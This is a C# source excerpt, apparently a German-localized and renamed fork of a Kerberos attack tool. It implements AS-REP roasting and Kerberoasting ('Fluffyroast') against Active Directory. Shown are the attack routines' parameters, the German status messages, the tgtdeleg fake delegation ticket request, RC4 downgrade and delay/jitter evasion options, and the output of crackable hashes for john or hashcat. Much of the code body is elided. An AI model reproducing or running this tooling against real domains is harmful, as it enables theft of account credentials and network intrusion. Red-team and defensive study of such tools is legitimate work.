...
namespace CrimsonRufus
{
    public class Roast
    {
        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false, string supportedEType = "rc4")
        {
            ...
            {
                Console.WriteLine("[*] Ziel-OU                 : {0}", OUName);
            }
            if (!String.IsNullOrEmpty(domain))
            {
                Console.WriteLine("[*] Ziel-Domäne             : {0}", domain);
            }
            if (!String.IsNullOrEmpty(domainController))
            {
                Console.WriteLine("[*] Ziel-DC                 : {0}", domainController);
            }
            ...
            else
            {
                ...
                if (users == null)
                {
                    Console.WriteLine("[X] Fehler beim Ausführen der LDAP-Abfrage.");
                    return;
                }
                if (users.Count == 0)
                {
                    Console.WriteLine("[X] Keine Benutzer zum AS-REP Roasten gefunden!");
                }
                ...
                foreach (IDictionary<string, Object> user in users)
                {
                    ...
                    {
                        Console.WriteLine("[*] Benutzer unterstützt DES!");
        ...
        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "", string supportedEType = "rc4")
        {
            ...
            Console.WriteLine("[*] Erstelle AS-REQ (ohne Preauth) für: '{0}\\{1}'", domain, userName);
            ...
            if (supportedEType == "rc4" || supportedEType == "des")
            {
                ...
                if (supportedEType.Equals("des"))
                {
                    if (format == "john")
                    {
                        Console.WriteLine("[!] DES für john-Format nicht unterstützt, bitte mit '/format:hashcat' erneut ausführen");
                        return;
                    }
            ...
            {
                Console.WriteLine("[*] Fordere AES128 (etype 17) als Verschlüsselungstyp an");
                ...
                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                {
                    ...
                    {
                        Console.WriteLine("[*] AES128 (etype 17) wird nicht unterstützt, versuche AES256 (etype 18)");
            ...
            {
                Console.WriteLine("Keine unterstützten Verschlüsselungstypen angegeben");
                return;
            }
            
            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                Console.WriteLine("[+] AS-REQ ohne Preauth erfolgreich!");
                ...
                {
                    Console.WriteLine("Bitte ein Cracking-Format angeben.");
                }
                ...
                if (!String.IsNullOrEmpty(outFile))
                {
                    ...
                    Console.WriteLine("[*] Hash geschrieben nach {0}\r\n", outFilePath);
                }
                else
                {
                    ...
                    if (CrimsonRufus.Program.wrapTickets)
                    {
        ...
        public static void Fluffyroast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false, string nopreauth = null)
        {
            if (userStats)
            {
                Console.WriteLine("[*] Zeige Statistiken über Ziel-Benutzer, keine Ticket-Anfragen werden durchgeführt.");
            }
            else if (!String.IsNullOrWhiteSpace(nopreauth))
            {
                Console.WriteLine(String.Format("[*] Verwende {0} ohne Pre-Auth um Service-Tickets anzufordern", nopreauth));
            }
            else if (TGT != null)
            {
                Console.WriteLine("[*] Verwende ein TGT /ticket um Service-Tickets anzufordern");
            }
            else if (useTGTdeleg || String.Equals(supportedEType, "rc4opsec"))
            {
                Console.WriteLine("[*] Verwende 'tgtdeleg' um ein TGT für den aktuellen Benutzer anzufordern");
                byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);
                TGT = new KRB_CRED(delegTGTbytes);
                Console.WriteLine("[*] RC4_HMAC wird für AES-aktivierte Konten angefordert, alle etypes werden für alles andere angefordert");
            }
            else
            {
                Console.WriteLine("[*] HINWEIS: AES-Hashes werden für AES-aktivierte Konten zurückgegeben.");
                Console.WriteLine("[*]          Verwenden Sie /ticket:X oder /tgtdeleg um RC4_HMAC für diese Konten zu erzwingen.\r\n");
            }

            if ((enterprise) && ((TGT == null) || ((String.IsNullOrEmpty(spn)) && (spns != null) && (spns.Count == 0))))
            {
                Console.WriteLine("[X] Um Enterprise Principals zu verwenden, muss /spn oder /spns zusammen mit /ticket oder /tgtdeleg angegeben werden");
                return;
            }

            if(delay != 0)
            {
                Console.WriteLine($"[*] Verwende eine Verzögerung von {delay} Millisekunden zwischen TGS-Anfragen.");
                if(jitter != 0)
                {
                    Console.WriteLine($"[*] Verwende einen Jitter von {jitter}% zwischen TGS-Anfragen.");
                }
                Console.WriteLine();
            }
            ...
            else
            {
                ...
                if (String.Equals(supportedEType, "rc4opsec"))
                {
                    ...
                    Console.WriteLine("[*] Suche nach Konten die nur RC4_HMAC unterstützen, kein AES");
                ...
                else if (String.Equals(supportedEType, "aes"))
                {
                    ...
                    Console.WriteLine("[*] Suche nach Konten die AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96 unterstützen");
                    encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                }
                ...
                if (!(String.IsNullOrEmpty(pwdSetAfter) & String.IsNullOrEmpty(pwdSetBefore)))
                {
                    ...
                    Console.WriteLine("[*] Suche nach Konten mit lastpwdset von {0} bis {1}", pwdSetAfter, pwdSetBefore);
                    ...
                    {
                        Console.WriteLine("\r\n[X] Fehler beim Parsen von /pwdsetbefore oder /pwdsetafter, bitte Format 'MM-dd-yyyy' verwenden");
                        return;
                    }
                }
                else
                ...
                if (users == null)
                {
                    Console.WriteLine("[X] LDAP-Abfrage fehlgeschlagen, versuchen Sie mehr Domäneninformationen oder spezifische SPNs anzugeben.");
                    return;
                }
                ...
                {
                    Console.WriteLine("\r\n[X] Fehler beim Ausführen der Domänensuche: {0}", ex);
                    return;
                }
            }
